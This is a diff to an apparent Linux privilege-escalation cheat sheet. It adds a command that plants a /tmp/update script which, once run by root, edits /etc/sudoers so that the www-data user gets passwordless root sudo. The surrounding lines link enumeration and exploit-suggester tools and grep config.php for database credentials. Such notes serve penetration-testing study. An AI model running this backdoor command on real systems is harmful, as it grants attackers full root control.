@@ -67,6 +67,8 @@ Find something
 cat config.php | grep db
 ```
 
+***
+
 ## Automated Scripts:
 
 * Linux Priv Checker:
@@ -88,6 +90,14 @@ https://github.com/PenturaLabs/Linux_Exploit_Suggester
 * Linux Post Exploatation:
 
 https://github.com/reider-roque/linpostexp
+
+***
+
+* Handy command if you can get a root user to run it. Add the www-data user to Root SUDO group with no password requirement
+
+```
+echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
+```
 
 
 
